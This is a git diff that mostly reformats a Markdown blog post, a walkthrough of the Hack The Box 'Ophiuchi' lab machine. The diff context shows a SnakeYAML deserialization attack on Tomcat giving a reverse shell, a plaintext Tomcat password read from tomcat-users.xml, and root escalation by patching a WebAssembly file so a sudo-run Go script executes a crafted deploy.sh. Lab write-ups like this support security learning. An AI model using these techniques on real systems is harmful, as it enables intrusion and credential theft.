@@ -1,30 +1,32 @@
 ---
-date: 2021-07-03 16:00:00
-images: 
-- https://i.imgur.com/r9JpwZX.png
+title: 'Walktrough: HTB Ophiuchi'
 language: en-US
 localeid: htb-ophiuchi
+date: 2021-07-03T16:00:00.000Z
 tags:
-- HackTheBox
-- HTB Medium
-- HTB Linux
-- Walktrough
-title: 'Walktrough: HTB Ophiuchi'
-authors: ['default']
+  - HackTheBox
+  - HTB Medium
+  - HTB Linux
+  - Walktrough
+summary: ''
+images:
+  - 'https://i.imgur.com/r9JpwZX.png'
+authors:
+  - default
 ---
 
 Hello guys!
 
 This week's machine will be **Ophiuchi**, another medium-rated box from [Hack The Box](https://www.hackthebox.eu/), created by [felamos](https://app.hackthebox.eu/users/27390).
 
-:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
-[info]
+\:information\_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
+\[info]
 
 ![htb-ophiuchi](https://i.imgur.com/RgW95kn.png)
 
 Recently I have been starting the recon of HTB boxes by searching a little about their names, as it or their images can give some cues on how to pwn them.
 
-Searching `define ophiuchi` in Google I was redirected to `define Ophiuchus, which is commonly represented as a man grasping a **snake**, what makes sense once we have a picture of a planet, astronaut, and some stars, but we'll see that isn't only that! :smiley:
+Searching `define ophiuchi` in Google I was redirected to \`define Ophiuchus, which is commonly represented as a man grasping a **snake**, what makes sense once we have a picture of a planet, astronaut, and some stars, but we'll see that isn't only that! \:smiley:
 
 ## Enumeration
 
@@ -61,7 +63,7 @@ Sending a simple payload (`teste: true`), the following message is returned:
 
 > Due to security reasons this feature has been temporarily on hold. We will soon fix the issue!
 
-Once Tomcat is a Java web server, and, based on the message returned, searched about `java yaml rce vulnerability` where I've found a [Medium post](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858) talking about a vuln called **SnakeYAML**, which had a PoC like the website we have. Also, as *snake* have some references to the constellation from which this box was named, proves we're on the right path :smile:.
+Once Tomcat is a Java web server, and, based on the message returned, searched about `java yaml rce vulnerability` where I've found a [Medium post](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858) talking about a vuln called **SnakeYAML**, which had a PoC like the website we have. Also, as *snake* have some references to the constellation from which this box was named, proves we're on the right path \:smile:.
 
 Following the suggestion in the post, started a simple http server using python (`sudo python3 -m http.server 80`) and sent the following payload:
 
@@ -123,7 +125,7 @@ After that, as well as copying the payload file to be executed, sent the payload
 ]
 ```
 
-And voilá! We got a reverse shell in the box! :smile:
+And voilá! We got a reverse shell in the box! \:smile:
 
 ```bash
 bash-5.0$ hostname && id
@@ -136,8 +138,8 @@ bash-5.0$
 
 Started the enumeration, as usual, using `linpeas.sh`, where I could identify the following points:
 
-- Tomcat service running with its specific account, allowing us to read the app files and logs
-- Enumerating the users in this box, found **admin**, the only one with console access (besides root).
+* Tomcat service running with its specific account, allowing us to read the app files and logs
+* Enumerating the users in this box, found **admin**, the only one with console access (besides root).
 
 With this information, verified the creds for Tomcat from `/opt/tomcat/conf/tomcat-users.xml` file, where the password **whythereisalimit** was found.
 
@@ -245,7 +247,7 @@ Searching a little on how to modify a wasm file, found this blog post on Mozilla
 
 The following steps were used to inspect and modify the `main.wasm` file:
 
-- Locate the file in the victim machine and make a copy using `scp`
+* Locate the file in the victim machine and make a copy using `scp`
 
 ```bash
 # Ophiuchi
@@ -260,14 +262,14 @@ $ cd ./loot
 $ scp admin@10.10.10.227:/opt/wasm-functions/main.wasm .
 ```
 
-- Downloaded the compiled `wabt` version to my working directory and extracted it
+* Downloaded the compiled `wabt` version to my working directory and extracted it
 
 ```bash
 wget https://github.com/WebAssembly/wabt/releases/download/1.0.23/wabt-1.0.23-ubuntu.tar.gz
 tar -xzvf wabt-1.0.23-ubuntu.tar.gz
 ```
 
-- Using the recently downloaded tool, converted the `main.wasm` to `main.wat`, where we got the following content
+* Using the recently downloaded tool, converted the `main.wasm` to `main.wat`, where we got the following content
 
 ```bash
 $ wabt-1.0.23/bin/wasm2wat main.wasm -o main.wat
@@ -287,16 +289,15 @@ $ cat main.wat
   (export "__heap_base" (global 2)))
 ```
 
-- Once we need to return `f == 1`, which is a property of `info`, we needed to change the line `i32.const 0` to `i32.const 1` at line 4.
-
-- After changing it, compiled the file again to `main.wasm` and transferred it to the victim machine as below
+* Once we need to return `f == 1`, which is a property of `info`, we needed to change the line `i32.const 0` to `i32.const 1` at line 4.
+* After changing it, compiled the file again to `main.wasm` and transferred it to the victim machine as below
 
 ```bash
 wabt-1.0.23/bin/wat2wasm main.wat -o main.wasm
 scp main.wasm admin@10.10.10.227:/dev/shm/zurc
 ```
-  
-- In a second attempt, we had success on running the crafted deploy.sh as root :smiley:
+
+* In a second attempt, we had success on running the crafted deploy.sh as root \:smiley:
 
 ```bash
 admin@ophiuchi:/dev/shm/zurc$ sudo /usr/bin/go run /opt/wasm-functions/index.go
@@ -304,7 +305,7 @@ Ready to deploy
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-- After that, modified the file to the previously shared reverse shell command line, obtained interactive access as root, and was able to get its flag.
+* After that, modified the file to the previously shared reverse shell command line, obtained interactive access as root, and was able to get its flag.
 
 ```bash
 $ nc -lnvp 4443
@@ -319,4 +320,4 @@ uid=0(root) gid=0(root) groups=0(root)
 
 I hope you have enjoyed it!
 
-See you in the next post :smile:
+See you in the next post \:smile:
